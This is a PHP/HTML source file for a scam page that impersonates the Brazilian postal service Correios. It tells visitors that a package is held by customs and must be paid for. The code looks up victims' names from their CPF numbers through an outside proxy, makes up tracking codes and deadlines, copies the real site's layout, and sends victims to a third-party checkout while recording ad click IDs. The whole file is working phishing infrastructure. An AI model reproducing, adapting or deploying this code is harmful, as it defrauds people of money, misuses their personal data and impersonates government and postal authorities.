<?php
/**
 * /taxa/ — money do funil CRR (rastreiopronto), SEM Typebot e SEM chat.rastreiofacil.cfd.
 *
 * Layout PORTADO byte-a-byte do freteagil (tema Correios: mesmo styles.css, FontAwesome,
 * imagens e estrutura). Diferencas em relacao ao freteagil, so o necessario:
 *   - dados (nome/cpf/codigo/datas) injetados SERVER-SIDE via PHP (nosso fluxo passa por URL,
 *     nao por localStorage como o freteagil);
 *   - os CTAs de pagamento apontam pro NOSSO checkout (pay.asegupag.com) com o gclid;
 *   - sem app.min.js do freteagil (era API-especifica dele) — JS minimo proprio no rodape.
 *
 * Regra de ouro do CRR: nenhum pixel de conversao aqui; atribuicao offline por gclid.
 */
function q($k){ return isset($_GET[$k]) ? trim((string)$_GET[$k]) : ''; }
$cid = q('gclid') ?: q('gbraid') ?: q('wbraid') ?: q('src');

$CHECKOUT = 'https://pay.asegupag.com/checkout/9e94cca3-f46e-4e45-a57b-e430f0aa6782';
$params = [];
if ($cid !== '') { $params['src'] = $cid; $params['utm_content'] = $cid; }
foreach (['utm_source','utm_medium','utm_campaign','utm_term'] as $u) {
    if (q($u) !== '') $params[$u] = q($u);
}
$PAGAR = $CHECKOUT . (empty($params) ? '' : ('?' . http_build_query($params)));
$PAGAR = htmlspecialchars($PAGAR);

// lookup de CPF (nome) via proxy interno; degrada sem quebrar
$cpf = preg_replace('/\D/', '', q('cpf'));
$nome = '';
if (strlen($cpf) === 11) {
    $ch = curl_init('https://typebot-cpf-proxy.tiectu.easypanel.host/consulta?cpf=' . $cpf);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>8, CURLOPT_SSL_VERIFYPEER=>true]);
    $raw = curl_exec($ch); curl_close($ch);
    if ($raw) { $d = json_decode($raw, true); $nome = trim($d['data']['DADOS']['nome'] ?? ''); }
}
$primeiro = $nome ? ucfirst(strtolower(strtok($nome, ' '))) : '';

// CPF mascarado pro breadcrumb (nao expor inteiro na tela)
$cpf_disp = strlen($cpf) === 11
    ? substr($cpf,0,3).'.***.***-'.substr($cpf,9,2)
    : '---';

// codigo de rastreio (veio? senao gera plausivel a partir do CPF)
$objeto = strtoupper(preg_replace('/[^A-Za-z0-9]/', '', q('objeto')));
if (!$objeto) {
    $n = substr(preg_replace('/\D/', '', ($cpf ?: '000000000')) . '000000000', 0, 9);
    $objeto = 'LB' . $n . 'BR';
}
// formata "AK 754 676 535 BR" -> aqui "LB 111 444 777 BR"
$obj_fmt = trim(preg_replace('/^([A-Z]{2})(\d{3})(\d{3})(\d{3})([A-Z]{2})$/', '$1 $2 $3 $4 $5', $objeto)) ?: $objeto;

// datas plausiveis
$prazo = date('d/m/Y', time() + 86400) . ' às 23:59';
$prev  = 'Dia ' . date('d/m/Y', time() + 3 * 86400);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#004169">
    <meta name="robots" content="noindex, nofollow">
    <title>Sua Encomenda - Rastreamento</title>
    <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
    <link rel="preload" href="assets/css/styles.css?v=2.2.1" as="style">
    <link rel="preload" href="assets/images/correios.webp" as="image" fetchpriority="high">
    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-light-300.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
    <style id="critical-inline">
      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column}
      img{max-width:100%;height:auto;display:block}
      a{color:inherit;text-decoration:none}
      button{cursor:pointer;border:0;background:none}
      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
      .logo-correios{height:25px;width:auto;display:block}
      .btn-entrar{display:none}
      .header-nav.has-user-name{justify-content:space-between}
      .header-nav.has-user-name .btn-entrar{display:flex;align-items:center;gap:.5rem}
      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
      .footer-container{max-width:1000px;margin:0 auto}
      .footer-links{display:none}
      .footer-bottom{display:flex;flex-direction:column;align-items:center}
      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
      [hidden]{display:none!important}
    </style>
    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
    <link rel="stylesheet" href="assets/css/styles.css?v=2.2.1">
</head>
<body>
    <header class="header">
        <nav class="header-nav<?= $primeiro ? ' has-user-name' : '' ?>" id="headerNav">
            <a href="#" class="logo-link">
                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
            </a>
            <a href="#" class="btn-entrar">
                <img src="assets/images/entrar.svg" alt="" class="icon-entrar" width="20" height="20" decoding="async">
                <span class="user-name"><?= $primeiro ? htmlspecialchars($primeiro) : 'Entrar' ?></span>
            </a>
        </nav>
    </header>

    <main class="main">
        <nav class="breadcrumb">
            <span>Portal Correios</span>
            <i class="fal fa-angle-right"></i>
            <span>Rastreamento</span>
            <i class="fal fa-angle-right"></i>
            <span class="cpf-display"><?= htmlspecialchars($cpf_disp) ?></span>
        </nav>

        <section class="alerta-principal">
            <h2 class="alerta-titulo">
                <i class="far fa-exclamation-triangle"></i>
                <span>VOCÊ TEM UM PACOTE<br class="mobile-only"> RETIDO NA FISCALIZAÇÃO!</span>
            </h2>
        </section>

        <div class="codigo-rastreio"><?= htmlspecialchars($obj_fmt) ?></div>

        <div class="status-pagamento">
            <span class="status-dot"></span>
            <span class="status-texto">AGUARDANDO PAGAMENTO</span>
        </div>

        <div class="info-tributacao">
            <p><strong>Situação:</strong> Objeto retido na fiscalização aduaneira.</p>
            <p class="prazo-oficial"><strong>Prazo final de retenção:</strong> <span id="prazoFinal"><?= $prazo ?></span></p>
            <p class="texto-urgente"><strong>Atenção:</strong> Após o prazo, a Receita Federal poderá determinar a DESTRUIÇÃO ou devolução do objeto. A regularização é a única forma de garantir o recebimento.</p>
        </div>

        <a href="<?= $PAGAR ?>" class="btn-pagar" id="btnPagar">
            📦 REGULARIZAR E LIBERAR ENTREGA
        </a>

        <section class="status-entrega alerta">
            <h3 class="status-entrega-titulo">
                <i class="far fa-file-exclamation"></i>
                <span>Aviso de objeto tributado:</span>
            </h3>
            <div class="imagem-nota">
                <img src="assets/images/nota-fiscal.webp" alt="Status da Encomenda" class="img-nota-fiscal">
            </div>
        </section>

        <section class="timeline">
            <div class="timeline-item">
                <div class="timeline-icon">
                    <img src="assets/images/correios-icon.webp" alt="Correios" class="icon-correios">
                </div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo">Previsão de Entrega da Mercadoria</h4>
                    <p class="timeline-data" id="previsaoEntrega"><?= $prev ?></p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"><i class="fal fa-usd-circle"></i></div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo texto-vermelho">Pendência fiscal identificada</h4>
                    <p class="timeline-descricao">Objeto aguardando regularização fiscal. Taxa de despacho pendente para liberação.</p>
                    <p class="timeline-link">Realize o pagamento: <a href="<?= $PAGAR ?>" class="link-pagamento">Clique Aqui Para Efetuar o Pagamento</a></p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"><i class="fal fa-search"></i></div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo">Objeto em análise fiscal</h4>
                    <p class="timeline-descricao">Encaminhado para Unidade de Fiscalização. Aguardando verificação tributária.</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"><i class="fal fa-truck"></i></div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo">Objeto em transferência</h4>
                    <p class="timeline-descricao">Em trânsito para Unidade de Tratamento. Processamento em andamento.</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"><i class="fal fa-truck-loading"></i></div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo">Objeto recebido na unidade</h4>
                    <p class="timeline-descricao">O objeto foi recebido e está passando por triagem, aguardando processamento.</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"><i class="fal fa-box-alt"></i></div>
                <div class="timeline-content">
                    <h4 class="timeline-titulo">Objeto Postado</h4>
                    <p class="timeline-descricao">Objeto coletado e registrado no sistema</p>
                </div>
            </div>
        </section>

        <section class="banner-section">
            <div class="carousel">
                <div class="carousel-inner">
                    <div class="carousel-slide active"><img src="assets/images/banner.webp" alt="Correios" class="banner-img" fetchpriority="high"></div>
                    <div class="carousel-slide"><img src="assets/images/banner2.webp" alt="Correios" class="banner-img" loading="lazy"></div>
                    <div class="carousel-slide"><img src="assets/images/banner3.webp" alt="Correios" class="banner-img" loading="lazy"></div>
                </div>
                <button class="carousel-btn carousel-btn-prev" aria-label="Anterior"><i class="fas fa-chevron-left"></i></button>
                <button class="carousel-btn carousel-btn-next" aria-label="Próximo"><i class="fas fa-chevron-right"></i></button>
                <div class="carousel-indicators">
                    <button class="carousel-indicator active" data-slide="0" aria-label="Slide 1"></button>
                    <button class="carousel-indicator" data-slide="1" aria-label="Slide 2"></button>
                    <button class="carousel-indicator" data-slide="2" aria-label="Slide 3"></button>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
                </div>
                <p class="footer-copyright">© 2026 Correios — Portal de Rastreamento</p>
            </div>
        </div>
    </footer>

    <script>
    (function(){
      // gclid glue: garante o click id no botao mesmo se o server nao pegou
      try{
        var qp=new URLSearchParams(location.search);
        var cid=qp.get('gclid')||qp.get('gbraid')||qp.get('wbraid')||qp.get('src')||'';
        if(cid){
          var base='https://pay.asegupag.com/checkout/9e94cca3-f46e-4e45-a57b-e430f0aa6782';
          var url=base+'?src='+encodeURIComponent(cid)+'&utm_content='+encodeURIComponent(cid);
          document.querySelectorAll('#btnPagar,a.link-pagamento').forEach(function(a){
            if((a.getAttribute('href')||'').indexOf('src=')===-1) a.setAttribute('href',url);
          });
        }
      }catch(e){}

      // carrossel (substitui o app.min.js do freteagil, so a parte visual)
      var slides=document.querySelectorAll('.carousel-slide'),
          inds=document.querySelectorAll('.carousel-indicator'), i=0;
      function go(n){
        i=(n+slides.length)%slides.length;
        slides.forEach(function(s,k){s.classList.toggle('active',k===i);});
        inds.forEach(function(s,k){s.classList.toggle('active',k===i);});
      }
      var prev=document.querySelector('.carousel-btn-prev'),
          next=document.querySelector('.carousel-btn-next');
      if(prev) prev.onclick=function(){go(i-1);};
      if(next) next.onclick=function(){go(i+1);};
      inds.forEach(function(s,k){s.onclick=function(){go(k);};});
      if(slides.length>1) setInterval(function(){go(i+1);},5000);
    })();
    </script>
</body>
</html>
